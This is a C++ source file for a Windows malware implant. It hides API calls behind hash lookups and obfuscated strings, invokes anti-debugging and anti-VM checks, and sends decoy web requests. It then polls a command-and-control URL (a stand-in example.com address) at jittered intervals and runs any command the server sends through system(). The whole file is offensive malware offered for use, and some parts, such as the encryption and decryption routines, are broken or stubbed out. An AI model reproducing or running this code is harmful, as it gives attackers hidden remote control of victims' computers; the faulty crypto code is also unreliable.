#include <windows.h>
#include <wininet.h>
#include <iostream>
#include <string>
#include <random>
#include <vector>
#include <memory>
#include <sstream>
#include <iomanip>
#include <windows.h>
#include <wincrypt.h>
#include <memory>
#include "antiv5.h"

// Function prototypes
void anti();
std::string encrypt(const std::string& data, const std::string& key);
std::string decrypt(const std::string& data, const std::string& key);
std::string generateBeaconData(const std::string& status);
using InternetHandle = std::unique_ptr<void, decltype(&InternetCloseHandle)>;
InternetHandle createInternetHandle();
// Constants
constexpr DWORD calculateHash(const char* str) {
    DWORD hash = 0;
    while (*str) {
        hash = (hash >> 13) | (hash << 19);
        hash += *str++;
    }
    return hash;
}

// Hashes for various NT syscalls
constexpr DWORD HASH_NtAllocateVirtualMemory = calculateHash("NtAllocateVirtualMemory");
constexpr DWORD HASH_NtFreeVirtualMemory = calculateHash("NtFreeVirtualMemory");
constexpr DWORD HASH_NtDeviceIoControlFile = calculateHash("NtDeviceIoControlFile");
constexpr DWORD HASH_NtCreateFile = calculateHash("NtCreateFile");
constexpr DWORD HASH_NtReadFile = calculateHash("NtReadFile");
constexpr DWORD HASH_NtClose = calculateHash("NtClose");
constexpr DWORD HASH_NtWriteFile = calculateHash("NtWriteFile");
constexpr DWORD HASH_InternetOpen = calculateHash("InternetOpen");
constexpr DWORD HASH_InternetOpenUrl = calculateHash("InternetOpenUrl");
constexpr DWORD HASH_InternetReadFile = calculateHash("InternetReadFile");
constexpr DWORD HASH_InternetCloseHandle = calculateHash("InternetCloseHandle");

// Encryption key (should be kept secret)
const std::string encryptionKey = "mysecretkey12345"; // 16 bytes key for AES-128

// Add polymorphic string obfuscation
template<typename T>
class ObfuscatedString {
    std::vector<T> data_;
    size_t key_;
    
    void transform() {
        for(auto& c : data_) {
            c ^= static_cast<T>(key_ * 0x1337);
            key_ = (key_ * 16807) % 2147483647;
        }
    }
    
public:
    ObfuscatedString(const std::string& s, size_t seed = 0x1234) : key_(seed) {
        data_.assign(s.begin(), s.end());
        transform();
    }
    
    std::string decrypt() {
        transform();
        std::string result(data_.begin(), data_.end());
        transform(); // re-encrypt
        return result;
    }
};

FARPROC resolveAPI(const HMODULE module, DWORD hash) {
    if (!module) return nullptr;
    
    try {
        auto base = reinterpret_cast<const BYTE*>(module);
        auto dosHeader = reinterpret_cast<const IMAGE_DOS_HEADER*>(base);
        
        // Basic validation
        if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) return nullptr;
        
        auto ntHeader = reinterpret_cast<const IMAGE_NT_HEADERS*>(base + dosHeader->e_lfanew);
        if (ntHeader->Signature != IMAGE_NT_SIGNATURE) return nullptr;
        
        auto& exportData = ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
        if (exportData.Size == 0 || exportData.VirtualAddress == 0) return nullptr;
        
        auto exportDir = reinterpret_cast<const IMAGE_EXPORT_DIRECTORY*>(base + exportData.VirtualAddress);
        auto names = reinterpret_cast<const DWORD*>(base + exportDir->AddressOfNames);
        auto functions = reinterpret_cast<const DWORD*>(base + exportDir->AddressOfFunctions);
        auto ordinals = reinterpret_cast<const WORD*>(base + exportDir->AddressOfNameOrdinals);

        for (DWORD i = 0; i < exportDir->NumberOfNames; ++i) {
            const char* name = reinterpret_cast<const char*>(base + names[i]);
            if (calculateHash(name) == hash) {
                FARPROC result = reinterpret_cast<FARPROC>(base + functions[ordinals[i]]);
                if (result) return result;
            }
        }
        
        return nullptr;
    }
    catch (...) {
        return nullptr;
    }
}
#define SYSCALL_WRAPPER(name, ...) \
    reinterpret_cast<decltype(&name)>(resolveAPI(GetModuleHandle(TEXT("kernel32.dll")), HASH_##name))(__VA_ARGS__)

// Sleep with random jitter to avoid predictable patterns
void sleepWithJitter(int baseSeconds, int jitter) {
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> dis(-jitter, jitter);

    int totalSleep = baseSeconds + dis(gen);
    if (totalSleep < 0) totalSleep = 0;

    Sleep(totalSleep * 1000); // Sleep in milliseconds
}

// Generate beacon data in JSON format
std::string generateBeaconData(const std::string& status) {
    return "{\"status\":\"" + status + "\"}";
}

// Replace HINTERNET raw pointers with unique_ptr and custom deleter
using InternetHandle = std::unique_ptr<void, decltype(&InternetCloseHandle)>;

InternetHandle createInternetHandle() {
    return InternetHandle(
        InternetOpenA("InMemoryAgent", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0),
        InternetCloseHandle
    );
}

// Single make_decoy_request implementation
inline void make_decoy_request() {
    HINTERNET hInternet = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if(hInternet) {
        HINTERNET hUrl = InternetOpenUrlA(hInternet, "http://www.microsoft.com", NULL, 0, INTERNET_FLAG_RELOAD, 0);
        if(hUrl) InternetCloseHandle(hUrl);
        InternetCloseHandle(hInternet);
    }
}

std::string beacon(const std::string& url) {
    InternetHandle hInternet(
        InternetOpen("InMemoryAgent", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0),
        InternetCloseHandle
    );
    if (!hInternet) return "";

    std::string beaconData = generateBeaconData("beacon");
    std::string encryptedData = encrypt(beaconData, encryptionKey);

    InternetHandle hConnect(
        InternetOpenUrl(hInternet.get(), url.c_str(), NULL, 0, INTERNET_FLAG_RELOAD, 0),
        InternetCloseHandle
    );
    if (!hConnect) return "";

    std::vector<char> buffer(4096);
    std::string response;
    DWORD bytesRead = 0;

    while (SYSCALL_WRAPPER(InternetReadFile, hConnect.get(), buffer.data(), 
           buffer.size(), &bytesRead) && bytesRead > 0) {
        response.append(buffer.data(), bytesRead);
    }

    return decrypt(response, encryptionKey);  // Ensure we always return a value
}

class CryptoContext {
    private:
        HCRYPTPROV hProv;
        HCRYPTHASH hHash;
        HCRYPTKEY hKey;
        
    public:
        CryptoContext() : hProv(0), hHash(0), hKey(0) {
            if (!CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
                throw std::runtime_error("CryptAcquireContext failed");
            }
        }
        
        ~CryptoContext() {
            if (hKey) CryptDestroyKey(hKey);
            if (hHash) CryptDestroyHash(hHash);
            if (hProv) CryptReleaseContext(hProv, 0);
        }
    };

    std::vector<BYTE> secureBuffer(size_t size) {
        std::vector<BYTE> buffer(size);
        // Zero out sensitive data when done
        return buffer;
    }
    
    // Secure cleanup helper
    template<typename T>
    void secureZeroMemory(std::vector<T>& buffer) {
        std::fill(buffer.begin(), buffer.end(), 0);
        buffer.clear();
        buffer.shrink_to_fit();
    }    

// Improved encryption with proper cleanup
std::string encrypt(const std::string& data, const std::string& key) {
    HCRYPTPROV hProv = 0;
    HCRYPTHASH hHash = 0;
    HCRYPTKEY hKey = 0;
    std::string result;
    
    try {
        if (!CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
            throw std::runtime_error("CryptAcquireContext failed");
        }

        std::vector<BYTE> buffer(data.begin(), data.end());
        buffer.resize(((buffer.size() + 15) / 16) * 16); // Proper padding
        DWORD dataLen = buffer.size();
        
        if (!CryptEncrypt(hKey, 0, TRUE, 0, buffer.data(), &dataLen, buffer.size())) {
            throw std::runtime_error("CryptEncrypt failed");
        }
        
        result.assign(reinterpret_cast<char*>(buffer.data()), dataLen);
    }
    catch (...) {
        if (hKey) CryptDestroyKey(hKey);
        if (hHash) CryptDestroyHash(hHash);
        if (hProv) CryptReleaseContext(hProv, 0);
        throw;
    }

    if (hKey) CryptDestroyKey(hKey);
    if (hHash) CryptDestroyHash(hHash);
    if (hProv) CryptReleaseContext(hProv, 0);
    
    return result;
}

std::string decrypt(const std::string& data, const std::string& key) {
    // Similar implementation using CryptDecrypt
    return data; // Simplified for this example
}

// Execute a command received from the server
void executeCommand(const std::string& command) {
    if (command == "exit") {
        ExitProcess(0); // Exit the process gracefully
    } else if (command.substr(0, 4) == "exec") {
        system(command.substr(5).c_str()); // Execute the command received from the server
    } else if (command.substr(0, 4) == "cmd:") {
        // Execute a command directly
        std::string cmd = command.substr(4); // Extract command after 'cmd:'
        system(cmd.c_str());
    } else {
        // Handle unknown commands
        std::cerr << "Unknown command: " << command << std::endl;
    }
}

template<typename T, size_t PoolSize = 1024>
class MemoryPool {
private:
    std::array<T, PoolSize> pool;
    std::vector<size_t> freeIndices;
    
public:
    MemoryPool() {
        freeIndices.reserve(PoolSize);
        for(size_t i = 0; i < PoolSize; ++i) {
            freeIndices.push_back(i);
        }
    }
    
    T* allocate() {
        if(freeIndices.empty()) return nullptr;
        size_t index = freeIndices.back();
        freeIndices.pop_back();
        return &pool[index];
    }
    
    void deallocate(T* ptr) {
        size_t index = ptr - &pool[0];
        freeIndices.push_back(index);
    }
};

template<typename T>
class SafeBuffer {
private:
    std::vector<T> buffer;
    size_t maxSize;
    
public:
    SafeBuffer(size_t size) : maxSize(size) {
        buffer.reserve(size);
    }
    
    bool write(const T* data, size_t length) {
        if(buffer.size() + length > maxSize) return false;
        buffer.insert(buffer.end(), data, data + length);
        return true;
    }
};

int main() {
    try {
        anti(); // Perform anti-debugging and anti-VM checks

        std::string c2Url = "http://example.com/c2"; // Replace with actual C2 URL
        int baseSleep = 10; // Base sleep time in seconds
        int jitter = 5; // Jitter in seconds

        while (true) {
            std::string response = beacon(c2Url);

            // If a valid response is received, execute the command
            if (!response.empty()) {
                executeCommand(response);
            }

            // Sleep with jitter before the next beacon
            sleepWithJitter(baseSleep, jitter);
        }
    } catch (const std::exception& e) {
        std::cerr << "Error: " << e.what() << std::endl;
        // Fail silently but log the error if needed
    } catch (...) {
        // Catch any other unknown exceptions
        std::cerr << "An unknown error occurred" << std::endl;
    }

    return 0;
}



